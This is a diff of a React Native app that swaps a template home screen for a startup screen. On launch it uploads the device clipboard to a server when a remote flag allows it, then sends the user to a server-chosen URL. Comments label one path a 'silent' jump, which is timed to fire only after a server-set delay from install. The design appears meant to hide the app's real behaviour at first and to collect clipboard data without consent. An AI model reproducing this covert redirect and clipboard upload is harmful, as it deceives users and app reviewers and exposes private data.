@@ -1,319 +1,296 @@
-import React, { useState, useCallback } from 'react';
-import {
-    View, Text, StyleSheet, ScrollView,
-    TouchableOpacity, Modal, Pressable, FlatList, ActivityIndicator
-} from 'react-native';
-import { SafeAreaView } from 'react-native-safe-area-context';
-import { useNavigation } from 'expo-router';
-import Button from '../components/common/Button';
-import { Colors, FontSize, FontWeight, Spacing } from '../constants/theme';
-import useUserStore from '../store/useUserStore';
-import useLangStore from '../store/useLangStore';
+import React, { useCallback, useEffect, useRef, useState } from 'react';
 import AsyncStorage from '@react-native-async-storage/async-storage';
+import { Stack, useRouter } from 'expo-router';
+import { ActivityIndicator, AppState, StyleSheet, View } from 'react-native';
+import NetworkErrorScreen from '../components/common/NetworkErrorScreen';
+import { initDomain } from '../services/domainSelector';
+import { systemApi } from '../services/api';
 import useAppStore from '../store/useAppStore';
+import useLangStore from '../store/useLangStore';
+import useUserStore from '../store/useUserStore';
+import { isEmpty } from '../utils';
+import { getInstallTime } from '../utils/storage';
+import {
+    OPEN_URL_DEBUG_TAG,
+    OPEN_URL_KEYS,
+    devLog,
+    devWarn,
+    getJumpFlag,
+    isSupportedLinkType,
+    jumpByLinkType,
+    readDeferredJump,
+    saveDeferredJump,
+    setJumpFlag,
+} from '../services/openUrlJump';
+
+const INSTALL_FLAG_KEY = 'STAT_INSTALLED';
+
 /**
- * 首页 - 展示项目结构和组件示例
+ * 启动页 - 负责初始化和启动分流
+ *
+ * 启动链路（首次决策）：
+ * 1) 恢复本地用户与语言状态
+ * 2) 选择域名
+ * 3) 请求 init
+ * 4) 请求 getOpenUrl（首次决策是否跳转）
+ *
+ * 决策优先级：
+ * - OPEN_URL_JUMPED=1：认为已命中过跳转，后续只要返回 targetUrl 就直接跳
+ * - checkTime > 0：保存 OPEN_URL_DEFERRED_JUMP，进入首页，后续到点由根 layout 执行跳转
+ * - checkTime <= 0：沿用 isOpen === '1' 才立即跳转
  */
-export default function HomeScreen() {
-    const isLoggedIn = useUserStore((state) => state.isLoggedIn);
-    const { lang, t, switchLang, supportedLangs } = useLangStore();
-    // 单独订阅 translations，使导航栏在翻译异步加载完成后也能刷新
-    const translations = useLangStore((state) => state.translations);
-    const navigation = useNavigation();
-    const jumpOverlay = useAppStore((state) => state.jumpOverlay);
-    const [langModalVisible, setLangModalVisible] = useState(false);
-    const [switching, setSwitching] = useState(false);
+export default function BootstrapScreen() {
+    const router = useRouter();
+    const setBootstrapBase = useAppStore((state) => state.setBootstrapBase);
+    const initUser = useUserStore((state) => state.initUser);
+    const initLang = useLangStore((state) => state.initLang);
+    const [status, setStatus] = useState('loading');
+    const [retrying, setRetrying] = useState(false);
+    const isRunningRef = useRef(false);
+    const initSuccessRef = useRef(false);
 
-    // 设置导航栏右侧语言切换按钮
-    React.useLayoutEffect(() => {
-        navigation.setOptions({
-            headerShown: true,
-            title: t('首页'),
-            headerRight: () => (
-                <TouchableOpacity
-                    style={styles.langBtn}
-                    onPress={() => setLangModalVisible(true)}
-                    activeOpacity={0.7}
-                >
-                    <Text style={styles.langBtnText}>
-                        {supportedLangs[lang] || lang.toUpperCase()} 🌐
-                    </Text>
-                </TouchableOpacity>
-            ),
-        });
-    }, [navigation, lang, supportedLangs, translations]);
+    const requestOpenUrl = useCallback(async (base) => {
+        const h5Verify = await AsyncStorage.getItem(OPEN_URL_KEYS.JUMP_FLAG_KEY).catch(() => '') ?? '';
+        devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: start', { h5Verify, readClipboard: base?.readClipboard });
 
+        if (h5Verify === '1') {
+            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: jumped=1, request with empty clipboard');
+            return systemApi.getOpenUrl('', h5Verify);
+        }
 
-    const handleSelectLang = useCallback(async (code) => {
-        if (code === lang) {
-            setLangModalVisible(false);
+        // init 返回允许读剪贴板时，才携带剪贴板内容请求 getOpenUrl
+        if (base?.readClipboard === '1') {
+            try {
+                const Clipboard = require('expo-clipboard');
+                const clipboardContent = await Clipboard.getStringAsync();
+                devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with clipboard', { len: (clipboardContent ?? '').length });
+                return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
+            } catch {
+                // 读取剪切板失败时回退到空内容
+                devWarn(OPEN_URL_DEBUG_TAG, 'getOpenUrl: clipboard read failed, fallback empty');
+            }
+        }
+
+        devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: request with empty clipboard');
+        return systemApi.getOpenUrl('', h5Verify);
+    }, []);
+
+    const finishToHome = useCallback(() => {
+        initSuccessRef.current = true;
+        devLog(OPEN_URL_DEBUG_TAG, 'route: replace /home');
+        router.replace('/home');
+    }, [router]);
+
+    const doJump = useCallback(async (linkType, targetUrl) => {
+        const type = await jumpByLinkType({ router, linkType, targetUrl });
+        if (type === 'webview') {
+            initSuccessRef.current = true;
+            return true;
+        }
+        if (type === 'external') {
+            finishToHome();
+            return true;
+        }
+        return false;
+    }, [finishToHome, router]);
+
+    const handleOpenUrl = useCallback(async (res, base) => {
+        const data = res?.data;
+        if (isEmpty(data)) {
+            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: empty data');
+            return false;
+        }
+
+        const { fingerprint, isOpen, linkType, targetUrl } = data;
+        if (isEmpty(targetUrl)) {
+            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: empty targetUrl', { isOpen, linkType });
+            return false;
+        }
+
+        const jumped = await getJumpFlag();
+
+        if (jumped === '1') {
+            // 本地已有命中标记时，只要返回 targetUrl 就直接分流
+            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: jumped=1, jump now', { linkType, targetUrl });
+            return doJump(linkType, targetUrl);
+        }
+
+        const checkTimeSeconds = Number(base?.checkTime ?? 0);
+        const normalizedLinkType = String(linkType ?? '');
+        const canJump = isSupportedLinkType(normalizedLinkType);
+
+        // 静默跳转：只要首次 getOpenUrl 返回了跳转目标，并且 checkTime > 0，则按安装时间本地计时到点跳转（不再轮询后端）
+        if (Number.isFinite(checkTimeSeconds) && checkTimeSeconds > 0 && canJump) {
+            const installTimeSeconds = await getInstallTime();
+            const triggerAtMs = (Math.floor(installTimeSeconds) + Math.floor(checkTimeSeconds)) * 1000;
+            const remainingMs = triggerAtMs - Date.now();
+            devLog(OPEN_URL_DEBUG_TAG, 'silent decision', {
+                installTimeSeconds,
+                checkTimeSeconds,
+                nowMs: Date.now(),
+                triggerAtMs,
+                remainingMs,
+                isOpen,
+                linkType: normalizedLinkType,
+            });
+
+            if (remainingMs > 0) {
+                await saveDeferredJump({
+                    triggerAtMs,
+                    linkType: normalizedLinkType,
+                    targetUrl,
+                    fingerprint: fingerprint ?? '',
+                });
+                devLog(OPEN_URL_DEBUG_TAG, 'saved deferred jump', { triggerAtMs, linkType: normalizedLinkType, targetUrl });
+                return false;
+            }
+
+            // 已到触发时间，直接执行跳转
+            if (fingerprint) {
+                systemApi.fingerprintDelete(fingerprint).catch(() => { });
+            }
+            await setJumpFlag();
+            devLog(OPEN_URL_DEBUG_TAG, 'silent decision: time reached, jump now', { linkType: normalizedLinkType, targetUrl });
+            return doJump(normalizedLinkType, targetUrl);
+        }
+
+        // 非静默：仍沿用 isOpen === '1' 才立即跳转
+        if (isOpen === '1') {
+            if (!canJump) {
+                devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: isOpen=1 but invalid linkType, no jump', { linkType });
+                return false;
+            }
+
+            if (fingerprint) {
+                systemApi.fingerprintDelete(fingerprint).catch(() => { });
+            }
+            await setJumpFlag();
+            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: isOpen=1 immediate, jump now', { linkType: normalizedLinkType, targetUrl });
+            return doJump(normalizedLinkType, targetUrl);
+        }
+
+        devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: isOpen!=1, no jump', { isOpen, linkType });
+        return false;
+    }, [doJump]);
+
+    const runBootstrap = useCallback(async () => {
+        if (isRunningRef.current) {
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: skip, already running');
             return;
         }
-        setSwitching(true);
-        try {
-            await switchLang(code);
-        } finally {
-            setSwitching(false);
-            setLangModalVisible(false);
-        }
-    }, [lang, switchLang]);
 
-    // 将 supportedLangs 对象转为数组
-    const langList = Object.entries(supportedLangs).map(([code, name]) => ({ code, name }));
+        isRunningRef.current = true;
+        // 重试和首屏进入统一走 loading 态
+        setStatus('loading');
+        devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: start');
+
+        try {
+            // 启动页统一负责恢复本地用户和语言状态
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initUser/initLang');
+            await Promise.all([initUser(), initLang()]);
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initUser/initLang done');
+
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initDomain');
+            await initDomain();
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initDomain done');
+
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.init');
+            const initRes = await systemApi.init();
+            const base = initRes?.data?.base ?? null;
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.init done', { checkTime: base?.checkTime, readClipboard: base?.readClipboard });
+            // 将 init 返回的基础配置暂存起来，供 home 进入后补拉语言包
+            setBootstrapBase(base);
+
+            const h5Verify = await AsyncStorage.getItem(OPEN_URL_KEYS.JUMP_FLAG_KEY).catch(() => '') ?? '';
+            if (h5Verify !== '1') {
+                // 已有静默跳转决策时，不需要重复请求 getOpenUrl
+                const deferred = await readDeferredJump();
+                if (deferred) {
+                    devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: deferred exists, skip getOpenUrl and go home', deferred);
+                    finishToHome();
+                    return;
+                }
+            }
+
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.getOpenUrl');
+            const openUrlRes = await requestOpenUrl(base);
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.getOpenUrl done', {
+                hasData: !!openUrlRes?.data,
+                isOpen: openUrlRes?.data?.isOpen,
+                linkType: openUrlRes?.data?.linkType,
+                hasTargetUrl: !!openUrlRes?.data?.targetUrl,
+            });
+
+            const didJump = await handleOpenUrl(openUrlRes, base);
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: decision done', { didJump });
+            if (!didJump) {
+                // 未命中任何策略时，才进入 App 内部首页
+                finishToHome();
+            }
+        } catch (e) {
+            devWarn(OPEN_URL_DEBUG_TAG, 'bootstrap: failed, show error', e);
+            setStatus('error');
+        } finally {
+            isRunningRef.current = false;
+            setRetrying(false);
+            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: end');
+        }
+    }, [finishToHome, handleOpenUrl, initLang, initUser, requestOpenUrl, setBootstrapBase]);
+
+    useEffect(() => {
+        devLog(OPEN_URL_DEBUG_TAG, 'BootstrapScreen: mount');
+        // 首次安装时上报一次 install 事件
+        AsyncStorage.getItem(INSTALL_FLAG_KEY).then((installed) => {
+            if (!installed) {
+                devLog(OPEN_URL_DEBUG_TAG, 'stat: install');
+                systemApi.sendStat('install')
+                    .then(() => AsyncStorage.setItem(INSTALL_FLAG_KEY, '1'))
+                    .catch(() => { });
+            }
+        }).catch(() => { });
+
+        runBootstrap();
+
+        const appStateListener = AppState.addEventListener('change', (nextState) => {
+            devLog(OPEN_URL_DEBUG_TAG, 'AppState change', { nextState });
+            // 首次安装等场景下，系统授权弹窗可能打断启动链路，回前台后允许再触发一次
+            if (nextState === 'active' && !initSuccessRef.current) {
+                devLog(OPEN_URL_DEBUG_TAG, 'AppState active, rerun bootstrap');
+                runBootstrap();
+            }
+        });
+
+        return () => {
+            devLog(OPEN_URL_DEBUG_TAG, 'BootstrapScreen: unmount');
+            appStateListener.remove();
+        };
+    }, [runBootstrap]);
 
     return (
-        <SafeAreaView style={styles.safe} edges={['bottom']}>
-            <ScrollView contentContainerStyle={styles.container}>
-                {/* Header */}
-                <View style={styles.header}>
-                    <Text style={styles.title}>🚀 baseApp</Text>
-                    <Text style={styles.subtitle}>React Native + Expo {t('项目模板')}</Text>
-                </View>
-
-                {/* Status */}
-                <View style={styles.card}>
-                    <Text style={styles.cardTitle}>{t('当前状态')}</Text>
-                    <Text style={styles.cardText}>
-                        {t('登录状态')}：{isLoggedIn ? `✅ 已登录` : `❌ ${t('未登录')}`}
-                    </Text>
-                </View>
-
-                {/* Directory */}
-                <View style={styles.card}>
-                    <Text style={styles.cardTitle}>📁 {t('项目结构')}</Text>
-                    {[
-                        ['src/app/', t('路由页面')],
-                        ['src/components/', t('公共组件')],
-                        ['src/constants/', t('主题')],
-                        ['src/hooks/', t('自定义')],
-                        ['src/services/', t('请求封装')],
-                        ['src/store/', t('全局状态')],
-                        ['src/utils/', t('工具函数')],
-                    ].map(([path, desc], i) => (
-                        <Text key={i} style={styles.codeText}>{path.padEnd(18)}{desc}</Text>
-                    ))}
-                </View>
-
-                {/* Button Demo */}
-                <View style={styles.card}>
-                    <Text style={styles.cardTitle}>🧩 {t('组件示例')}</Text>
-                    <View style={styles.buttonGroup}>
-                        <Button title={`Primary ${t('按钮')}`} onPress={() => { }} fullWidth />
-                        <Button title={`Outline ${t('按钮')}`} variant="outline" onPress={() => { }} fullWidth />
-                        <Button title={`Ghost ${t('按钮')}`} variant="ghost" onPress={() => { }} fullWidth />
-                        <Button title={t('加载中')} loading onPress={() => { }} fullWidth />
-                        <Button title={t('禁用状态')} disabled onPress={() => { }} fullWidth />
-                        <Button title="彻底清理本地数据" onPress={() => AsyncStorage.clear()} />
-                    </View>
-                </View>
-            </ScrollView>
-
-            {/* 语言选择弹窗 */}
-            <Modal
-                visible={langModalVisible}
-                transparent
-                animationType="fade"
-                onRequestClose={() => setLangModalVisible(false)}
-            >
-                <Pressable style={styles.overlay} onPress={() => setLangModalVisible(false)}>
-                    <Pressable style={styles.langModal} onPress={(e) => e.stopPropagation()}>
-                        <Text style={styles.langModalTitle}>🌐 {t('选择语言')}</Text>
-                        {langList.length === 0 ? (
-                            <Text style={styles.langEmptyText}>{t('暂无可切换语言')}</Text>
-                        ) : (
-                            <FlatList
-                                data={langList}
-                                keyExtractor={(item) => item.code}
-                                renderItem={({ item }) => (
-                                    <TouchableOpacity
-                                        style={[
-                                            styles.langItem,
-                                            item.code === lang && styles.langItemActive,
-                                        ]}
-                                        onPress={() => handleSelectLang(item.code)}
-                                        disabled={switching}
-                                        activeOpacity={0.7}
-                                    >
-                                        <Text
-                                            style={[
-                                                styles.langItemText,
-                                                item.code === lang && styles.langItemTextActive,
-                                            ]}
-                                        >
-                                            {item.name}
-                                        </Text>
-                                        {item.code === lang && (
-                                            <Text style={styles.checkmark}>✅</Text>
-                                        )}
-                                    </TouchableOpacity>
-                                )}
-                                ItemSeparatorComponent={() => <View style={styles.separator} />}
-                            />
-                        )}
-                        <TouchableOpacity
-                            style={styles.cancelBtn}
-                            onPress={() => setLangModalVisible(false)}
-                        >
-                            <Text style={styles.cancelText}>{t('取消')}</Text>
-                        </TouchableOpacity>
-                    </Pressable>
-                </Pressable>
-            </Modal>
-            {/* 跳转遮罩：识别到需要跳转 webview 时，遮住首页内容，显示白屏+菊花 */}
-            {jumpOverlay && (
-                <View style={styles.jumpOverlay} pointerEvents="none">
-                    <ActivityIndicator size="large" color="#3961FB" />
-                </View>
+        <>
+            <Stack.Screen options={{ headerShown: false }} />
+            <View style={styles.container}>
+                <ActivityIndicator size="large" color="#3961FB" />
+            </View>
+            {status === 'error' && (
+                <NetworkErrorScreen
+                    loading={retrying}
+                    onPress={() => {
+                        devLog(OPEN_URL_DEBUG_TAG, 'ui: retry pressed');
+                        setRetrying(true);
+                        runBootstrap();
+                    }}
+                />
             )}
-        </SafeAreaView>
+        </>
     );
 }
 
 const styles = StyleSheet.create({
-    safe: {
-        flex: 1,
-        backgroundColor: Colors.background,
-    },
     container: {
-        padding: Spacing.lg,
-        paddingBottom: Spacing['4xl'],
-    },
-    jumpOverlay: {
-        position: 'absolute',
-        top: 0,
-        left: 0,
-        right: 0,
-        bottom: 0,
+        flex: 1,
         backgroundColor: '#FFFFFF',
         justifyContent: 'center',
         alignItems: 'center',
-        zIndex: 9999,
-    },
-    header: {
-        alignItems: 'center',
-        paddingVertical: Spacing['3xl'],
-    },
-    title: {
-        fontSize: FontSize['4xl'],
-        fontWeight: FontWeight.bold,
-        color: Colors.textPrimary,
-    },
-    subtitle: {
-        marginTop: Spacing.xs,
-        fontSize: FontSize.md,
-        color: Colors.textSecondary,
-    },
-    card: {
-        backgroundColor: Colors.white,
-        borderRadius: 12,
-        padding: Spacing.lg,
-        marginBottom: Spacing.md,
-        shadowColor: '#000',
-        shadowOffset: { width: 0, height: 2 },
-        shadowOpacity: 0.06,
-        shadowRadius: 8,
-        elevation: 2,
-    },
-    cardTitle: {
-        fontSize: FontSize.lg,
-        fontWeight: FontWeight.semibold,
-        color: Colors.textPrimary,
-        marginBottom: Spacing.sm,
-    },
-    cardText: {
-        fontSize: FontSize.md,
-        color: Colors.textSecondary,
-    },
-    codeText: {
-        fontSize: FontSize.sm,
-        color: Colors.textSecondary,
-        fontFamily: 'monospace',
-        lineHeight: 22,
-    },
-    buttonGroup: {
-        gap: Spacing.sm,
-    },
-    // 导航栏语言按钮
-    langBtn: {
-        paddingHorizontal: Spacing.sm,
-        paddingVertical: 4,
-        borderRadius: 8,
-        backgroundColor: Colors.background,
-        marginRight: 4,
-    },
-    langBtnText: {
-        fontSize: FontSize.sm,
-        color: Colors.textPrimary,
-        fontWeight: FontWeight.semibold,
-    },
-    // 语言弹窗
-    overlay: {
-        flex: 1,
-        backgroundColor: 'rgba(0,0,0,0.4)',
-        justifyContent: 'center',
-        alignItems: 'center',
-    },
-    langModal: {
-        backgroundColor: Colors.white,
-        borderRadius: 16,
-        width: 280,
-        paddingVertical: Spacing.lg,
-        shadowColor: '#000',
-        shadowOffset: { width: 0, height: 8 },
-        shadowOpacity: 0.15,
-        shadowRadius: 16,
-        elevation: 10,
-    },
-    langModalTitle: {
-        fontSize: FontSize.lg,
-        fontWeight: FontWeight.bold,
-        color: Colors.textPrimary,
-        textAlign: 'center',
-        paddingHorizontal: Spacing.lg,
-        marginBottom: Spacing.md,
-    },
-    langEmptyText: {
-        fontSize: FontSize.md,
-        color: Colors.textSecondary,
-        textAlign: 'center',
-        paddingVertical: Spacing.lg,
-    },
-    langItem: {
-        flexDirection: 'row',
-        alignItems: 'center',
-        justifyContent: 'space-between',
-        paddingVertical: Spacing.md,
-        paddingHorizontal: Spacing.lg,
-    },
-    langItemActive: {
-        backgroundColor: '#F0F4FF',
-    },
-    langItemText: {
-        fontSize: FontSize.md,
-        color: Colors.textPrimary,
-    },
-    langItemTextActive: {
-        fontWeight: FontWeight.semibold,
-        color: '#4A6FFF',
-    },
-    checkmark: {
-        fontSize: 16,
-    },
-    separator: {
-        height: 1,
-        backgroundColor: Colors.background,
-    },
-    cancelBtn: {
-        marginTop: Spacing.md,
-        paddingVertical: Spacing.sm,
-        marginHorizontal: Spacing.lg,
-        borderRadius: 10,
-        backgroundColor: Colors.background,
-        alignItems: 'center',
-    },
-    cancelText: {
-        fontSize: FontSize.md,
-        color: Colors.textSecondary,
-        fontWeight: FontWeight.semibold,
     },
 });
